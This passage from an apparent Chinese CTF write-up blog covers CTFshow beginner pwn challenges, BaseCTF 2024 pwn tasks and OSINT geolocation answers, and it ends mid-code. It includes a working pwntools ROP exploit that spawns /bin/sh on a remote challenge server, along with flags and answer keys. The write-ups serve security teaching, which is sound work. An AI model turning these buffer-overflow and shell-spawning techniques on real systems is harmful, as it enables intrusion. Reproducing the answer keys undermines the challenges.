-c来执行command指定的命</p><p>令。&#x2F;bin&#x2F;sh在系统中一般是个软链接，指向dash或者bash等常用的shell，-c选项是告诉shell从字符串command中读取要执行的命令（shell将扩展command中的任何特殊字符）。父进程则调用waitpid()函数来为变成僵尸的子进程收尸，获得其结束状态，然后将这个结束状态返回给system()函数的调用者。那么也就是说执行完这个后它就会返回一个shell给函数的调用者：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Test</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : To give you a shell!</span><br><span class="line">    * *************************************</span><br><span class="line"> Now, you can use <span class="string">&#x27;cat /ctfshow_flag&#x27;</span> to get flag!</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1000(helloctfos) gid=1000(helloctfos) <span class="built_in">groups</span>=1000(helloctfos),4(adm),20(dialout),24(cdrom),25(floppy),27(<span class="built_in">sudo</span>),29(audio),30(dip),44(video),46(plugdev),116(netdev),999(docker)</span><br><span class="line">$ <span class="built_in">whoami</span></span><br><span class="line">helloctfos</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">$ <span class="built_in">cat</span> /ctfshow_flag</span><br></pre></td></tr></table></figure><p>也就达到了远程命令执行的效果了，读取flag只需要执行“cat &#x2F;ctfshow_flag”命令即可,在做题过程中现在可以了解到：system(“cat &#x2F;ctfshow_flag”);system(“&#x2F;bin&#x2F;sh”);这一类的我们称之为后门函数，再后续利用过程中我们要尽可能找到或者构造出来,后续会逐步完善。</p><h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><p>Hint：哪一个函数才能读取flag？</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">远程：</span><br><span class="line">nc ip 端口</span><br></pre></td></tr></table></figure><p>本地：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Test</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Choice the right backdoor !</span><br><span class="line">    * *************************************</span><br><span class="line">[*] level up ! Let<span class="string">&#x27;s go !</span></span><br><span class="line"><span class="string">You can call the following function:</span></span><br><span class="line"><span class="string">1._start</span></span><br><span class="line"><span class="string">2.main</span></span><br><span class="line"><span class="string">3.hello_ctfshow</span></span><br><span class="line"><span class="string">4.ctfshow(&#x27;</span><span class="built_in">echo</span> /ctfshow_flag<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">5.print(&#x27;</span>/ctfshow_flag<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">6.system(&#x27;</span><span class="built_in">cat</span> /ctfshow_flag<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">7.puts(&#x27;</span>/ctfshow_flag<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">8.exit</span></span><br><span class="line"><span class="string">Your choice is :</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">6</span></span><br><span class="line"><span class="string">flag&#123;just_test_my_process&#125;</span></span><br></pre></td></tr></table></figure><p>通过前面的分析，可以很明显的看出来选项”6”是所需要的后门函数，其他的均不会得到所想要的flag。但是很多时候它回显给你的并不一定是它一定就执行了此类，就是有可能是“虚晃一枪”，它回显给你说它执行了这个，但是实际上没有执行的情况，最终情况还得自己多进行分析。</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec  pwn</span><br><span class="line">  Arch:     amd64-64-little</span><br><span class="line">  RELRO:    Full RELRO</span><br><span class="line">  Stack:    Canary found</span><br><span class="line">  NX:       NX enabled</span><br><span class="line">  PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>64位,保护全开</p><p>用64位IDA打开查看main函数（按F5进入反汇编或者Tab键）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **envp_1; <span class="comment">// rdx</span></span><br><span class="line">  _BYTE argva[<span class="number">12</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;argva[<span class="number">4</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] level up ! Let&#x27;s go ! &quot;</span>);</span><br><span class="line">  menu();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your choice is :\n&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, argva);</span><br><span class="line">  <span class="keyword">switch</span> ( *(_DWORD *)argva )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;start&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      main((<span class="type">int</span>)<span class="string">&quot;%d&quot;</span>, (<span class="type">const</span> <span class="type">char</span> **)argva, envp_1);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Hello CTFshow&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      ctfshow();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      system_func();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;/ctfshow_flag&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Invalid input&quot;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到程序的流程还是很简单，先回显出一个字符串说难度升级，开始，然后有一个菜单，再让你输入选项，会进入对应的分支。跟进menu：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You can call the following function:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1._start&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.main&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.hello_ctfshow&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4.ctfshow(&#x27;echo /ctfshow_flag&#x27;)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;5.print(&#x27;/ctfshow_flag&#x27;)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;6.system(&#x27;cat /ctfshow_flag&#x27;)&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;7.puts(&#x27;/ctfshow_flag&#x27;)&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;8.exit&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们已经了解到后门函数是这里的选项6，我们首先就跟进看它是否执行了它：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">system_func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat /ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，确实是执行了。那么也就能得到需要的flag了。</p><h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><p>Hint: 或许需要先得到某个神秘字符</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">远程：</span><br><span class="line">nc ip 端口</span><br></pre></td></tr></table></figure><p>本地：</p><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec  pwn</span><br><span class="line">  Arch:     amd64-64-little</span><br><span class="line">  RELRO:    Full RELRO</span><br><span class="line">  Stack:    Canary found</span><br><span class="line">  NX:       NX enabled</span><br><span class="line">  PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>64位,保护全开</p><p>用64位IDA打开查看main函数（按F5进入反汇编或者Tab键）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1[<span class="number">11</span>]; <span class="comment">// [rsp+1h] [rbp-1Fh] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">12</span>]; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(s1, <span class="string">&quot;CTFshowPWN&quot;</span>);</span><br><span class="line">  logo();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;find the secret !&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s2);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s2) )</span><br><span class="line">    execve_func();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致流程如下：</p><p>首先将字符串 “CTFshowPWN” 复制到 s1 变量中。</p><p>接着，使用 puts 函数输出字符串 “find the secret !”。</p><p>紧接着，通过 __isoc99_scanf 函数从用户输入中读取一个字符串到 s2 变量中。</p><p>最后，通过 strcmp 函数比较 s1 和 s2 的内容是否相同。如果相同，则调用 execve_func 函数。</p><p>跟进execve_func()：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">execve_func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *argv[<span class="number">3</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  argv[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">  argv[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  argv[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到将字符串 “&#x2F;bin&#x2F;sh” 赋值给 argv 变量。</p><p>然后，将 v2 和 v3 初始化为 0。</p><p>通过调用 execve 系统调用来执行 &#x2F;bin&#x2F;sh shell。</p><p>因此这里的execve_func也就是我们所谓的一个后门函数了</p><p>execve 本身并不是一个后门函数。实际上， execve 是一个标准的系统调用函数，用于在 Linux和类 Unix 系统中执行一个新的程序。它的原型如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> execve（<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> envp[]);</span><br></pre></td></tr></table></figure><p>该函数接受三个参数：</p><ol><li><code>filename</code> ：要执行的程序的文件名或路径。</li><li><code>argv</code> ：一个以 NULL 结尾的字符串数组，表示传递给新程序的命令行参数。</li><li><code>envp</code> ：一个以 NULL 结尾的字符串数组，表示新程序的环境变量。</li></ol><p>当调用 execve 函数时，它会将当前进程替换为新程序的代码，并开始执行新程序。新程序接收idargv 和 envp 作为命令行参数和环境变量。</p><p>在加入某些参数后就可以达到我们所需要的后门函数的效果。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Test</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : New backdoor !</span><br><span class="line">    * *************************************</span><br><span class="line">find the secret !</span><br><span class="line">CTFshowPWN</span><br><span class="line">$ </span><br></pre></td></tr></table></figure><p>因此，针对本题来讲，当输入“CTFshowPWN”后就能够得到所需要的shell了，进而就能拿到所需的flag。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Aura 酱的旅行日记 VI &lt;图寻擂台&gt;</title>
      <link href="/2025/07/e975431024f1.html"/>
      <url>/2025/07/e975431024f1.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>链接: <a href="../../../images/baseCTF_osint6.jpg">Aura 酱的旅行日记 VI &lt;图寻擂台&gt;</a></p></blockquote><p>识图一下，太原五中</p><p>BaseCTF{山西省太原市迎泽区青年路49号太原市第五中学校-建校时间1906年}</p>]]></content>
      
      
      <categories>
          
          <category> BaseCTF2024新生赛 </category>
          
          <category> OSINT </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Aura 酱的旅行日记 VII &lt;图寻擂台&gt;</title>
      <link href="/2025/07/9ed1a8ef83f0.html"/>
      <url>/2025/07/9ed1a8ef83f0.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>链接: <a href="../../../images/baseCTF_osint7.jpg">Aura 酱的旅行日记 VII &lt;图寻擂台&gt;</a></p></blockquote><p>下雪，偏北省份，科创大厦(安阳市文峰区)，google地图搜索，结果好几个，河南省，北京烤鸭，一分利，生活超市</p><p>用map.baidu.com</p><p><img src="/../../../images/image-20250706015857876.png" alt="image-20250706015857876"></p><p>BaseCTF{河南省安阳市文峰区峨嵋大街与广顺街交叉口}</p>]]></content>
      
      
      <categories>
          
          <category> BaseCTF2024新生赛 </category>
          
          <category> OSINT </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Aura 酱的旅行日记 VIII &lt;图寻擂台&gt;</title>
      <link href="/2025/07/866d5c5d072e.html"/>
      <url>/2025/07/866d5c5d072e.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>链接: <a href="../../../images/baseCTF_osint8.jpg">Aura 酱的旅行日记 VIII &lt;图寻擂台&gt;</a></p></blockquote><p>识图一下，布鲁维斯号在山东威海搁浅</p><p>BaseCTF{山东省威海市荣成市环海路布鲁之星海岸餐厅-布鲁维斯-巴拿马}</p>]]></content>
      
      
      <categories>
          
          <category> BaseCTF2024新生赛 </category>
          
          <category> OSINT </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Aura 酱的旅行日记 I &lt;图寻擂台&gt;</title>
      <link href="/2025/07/c93b1805b01a.html"/>
      <url>/2025/07/c93b1805b01a.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>链接: <a href="../../../images/baseCTF_osint1.jpg">Aura 酱的旅行日记 I &lt;图寻擂台&gt;</a></p></blockquote><p>识图一下，成都自然博物馆，<code>后续的题大概率都是在四川成都了</code></p>]]></content>
      
      
      <categories>
          
          <category> BaseCTF2024新生赛 </category>
          
          <category> OSINT </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>echo</title>
      <link href="/2025/07/a8a0d64a71d4.html"/>
      <url>/2025/07/a8a0d64a71d4.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nc gz.imxbt.cn 20139</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">/bin/bash: line 1: <span class="built_in">ls</span>: <span class="built_in">command</span> not found</span><br><span class="line"><span class="built_in">echo</span> flag</span><br><span class="line">flag</span><br><span class="line">./flag</span><br><span class="line">./flag: line 1: BaseCTF&#123;39c0eb5c-df53-4288-bd44-8cebda8c7bdf&#125;: <span class="built_in">command</span> not found</span><br><span class="line">或者</span><br><span class="line"><span class="built_in">echo</span> `&lt;/flag`</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Aura 酱的旅行日记 II &lt;图寻擂台&gt;</title>
      <link href="/2025/07/830c59681811.html"/>
      <url>/2025/07/830c59681811.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>链接: <a href="../../../images/baseCTF_osint2.jpg">Aura 酱的旅行日记 II &lt;图寻擂台&gt;</a></p></blockquote><p>格式：<code>BaseCTF&#123;xxx省xxx市xxx路xxx号xxx酒店(公寓)&#125;</code></p><p>图片上文字首东置业，找一下首东置业附近的酒店，尤其是公寓先尝试。</p><p><img src="/../../../images/image-20250705232545229.png" alt="image-20250705232545229"></p>]]></content>
      
      
      <categories>
          
          <category> BaseCTF2024新生赛 </category>
          
          <category> OSINT </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Aura 酱的旅行日记 IV &lt;图寻擂台&gt;</title>
      <link href="/2025/07/ddc07d9e97e2.html"/>
      <url>/2025/07/ddc07d9e97e2.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>链接: <a href="../../../images/baseCTF_osint4.jpg">Aura 酱的旅行日记 IV &lt;图寻擂台&gt;</a></p></blockquote><p>识图一下，南京夫子庙，这条街在售票处那才对的(哭泣)</p><p>BaseCTF{江苏省南京市秦淮区贡院街夫子庙景区}</p>]]></content>
      
      
      <categories>
          
          <category> BaseCTF2024新生赛 </category>
          
          <category> OSINT </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Aura 酱的旅行日记 IX &lt;图寻擂台&gt;</title>
      <link href="/2025/07/1676f42986e0.html"/>
      <url>/2025/07/1676f42986e0.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>链接: <a href="../../../images/baseCTF_osint9.jpg">Aura 酱的旅行日记 IX &lt;图寻擂台&gt;</a></p></blockquote><p><img src="/../../../images/image-20250706025045173.png" alt="image-20250706025045173"></p><p>BaseCTF{陕西省西安市灞桥区AR浐灞后海观景平台-灞河东路}</p>]]></content>
      
      
      <categories>
          
          <category> BaseCTF2024新生赛 </category>
          
          <category> OSINT </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Aura 酱的旅行日记 V &lt;图寻擂台&gt;</title>
      <link href="/2025/07/2c5c07033896.html"/>
      <url>/2025/07/2c5c07033896.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>链接: <a href="../../../images/baseCTF_osint5.jpg">Aura 酱的旅行日记 V &lt;图寻擂台&gt;</a></p></blockquote><p>识图一下，邓小平先生，注意格式</p><p>BaseCTF{四川省广安市广安区邓小平故里-邓小平铜像广场and邓小平故居陈列馆}</p>]]></content>
      
      
      <categories>
          
          <category> BaseCTF2024新生赛 </category>
          
          <category> OSINT </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Aura 酱的旅行日记 III &lt;图寻擂台&gt;</title>
      <link href="/2025/07/896b69ddd920.html"/>
      <url>/2025/07/896b69ddd920.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>链接: <a href="../../../images/baseCTF_osint3.jpg">Aura 酱的旅行日记 III &lt;图寻擂台&gt;</a></p></blockquote><p>熊猫重点，边上的字大概是：熊猫联萌，萌动瓦*</p><p><img src="/../../../images/image-20250705234251755.png" alt="image-20250705234251755"></p><p>答案是瓦屋山咯</p>]]></content>
      
      
      <categories>
          
          <category> BaseCTF2024新生赛 </category>
          
          <category> OSINT </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>彻底失去她</title>
      <link href="/2025/07/583d074810f2.html"/>
      <url>/2025/07/583d074810f2.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>点击下载: <a href="../../../challeges/pwn1">彻底失去她</a></p></blockquote><p>checksec一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec pwn1</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x400000)</span><br><span class="line">  SHSTK:      Enabled</span><br><span class="line">  IBT:        Enabled</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>只有数据段不可执行保护，64位程序，扔进ida里</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you for helping me find her.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But she has left me for good this time, what should I do?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;By the way, I still don&#x27;t know your name, could you tell me your name?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现本题仍有system函数，只是通过查找发现本题没有&#x2F;bin&#x2F;sh字符串，所以我们需要调用read函数，将&#x2F;bin&#x2F;sh写入.bss段后，再调用system函数，read函数的三个参数顺序位rdi rsi rdx，依次布置为0，buf，0x10，然后这时候read函数调用的就是read(0,buf,0x10)</p><p>查找一下相关命令的地址</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary pwn1 --only <span class="string">&#x27;pop|ret&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040117d : pop rbp ; ret</span><br><span class="line">0x0000000000401196 : pop rdi ; ret</span><br><span class="line">0x0000000000401265 : pop rdx ; ret</span><br><span class="line">0x00000000004011ad : pop rsi ; ret</span><br><span class="line">0x000000000040101a : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 5</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:00000000004040A0                 public buffer</span><br><span class="line">.bss:00000000004040A0 buffer          db    ? ;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&quot;gz.imxbt.cn&quot;</span>,<span class="number">20153</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">read=elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x401196</span></span><br><span class="line">pop_rsi_ret=<span class="number">0x4011ad</span></span><br><span class="line">pop_rdx_ret=<span class="number">0x401265</span></span><br><span class="line">bss=<span class="number">0x4040a0</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xa</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(pop_rsi_ret)+p64(bss)</span><br><span class="line">payload+=p64(pop_rdx_ret)+p64(<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(read)<span class="comment">#read(0,buf,0x10)</span></span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(bss)+p64(system_plt)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)<span class="comment">#x00为字符串结束符</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> BaseCTF2024新生赛 </category>
          
          <category> Pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>我把她丢了</title>
      <link href="/2025/07/6391c823fb0c.html"/>
      <url>/2025/07/6391c823fb0c.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>点击下载: <a href="../../../challeges/pwn2">我把她丢了</a></p></blockquote><p>checksec一下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec pwn2</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        No PIE (0x400000)</span><br><span class="line">  SHSTK:      Enabled</span><br><span class="line">  IBT:        Enabled</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>发现文件只开启了数据段不可执行的保护，64位的可执行文件。接着丢进64位ida里</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">112</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I lost her, what should I do? Help me find her.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x150u</span>LL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">shell</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo I beleve you.&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现了后门函数，可是后门函数中的参数不是我们所期待的&#x2F;bin&#x2F;sh，所以我们接下来有两种想法：1.查找该程序中是否含有&#x2F;bin&#x2F;sh，有则构造栈帧，将其作为system的参数进行调用</p><p>2.若不含有，则手动输入&#x2F;bin&#x2F;sh</p><p>通过查找发现&#x2F;bin&#x2F;sh存在</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rodata:0000000000402008aBinSh          db &#x27;/bin/sh&#x27;,0          ; DATA XREF: .data:hidden_str↓o</span><br></pre></td></tr></table></figure><p>所以，接下来我们就要构造栈帧，因为该程序为64位程序，64位程序传参和32位程序传参有差异：</p><p>当程序参数不超过6个时，参数按需使用rdi、rsi、rdx、rcx、r8d和r9d寄存器传递到子函数<br>当参数超过6个时，前6个参数传递方式不变，从第七个参数起，后面的参数都通过栈传递<br>所以我们需要找到pop_edi_ret指令的地址和ret的地址。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary pwn2 --only <span class="string">&#x27;pop|ret&#x27;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x000000000040117d : pop rbp ; ret</span><br><span class="line">0x0000000000401196 : pop rdi ; ret</span><br><span class="line">0x000000000040101a : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 3</span><br></pre></td></tr></table></figure><p>接下来我们payload的构造思路为，先利用pop_edi_ret指令将&#x2F;bin&#x2F;sh字符串地址放在edi里，然后调用system函数的plt表，获取shell</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span 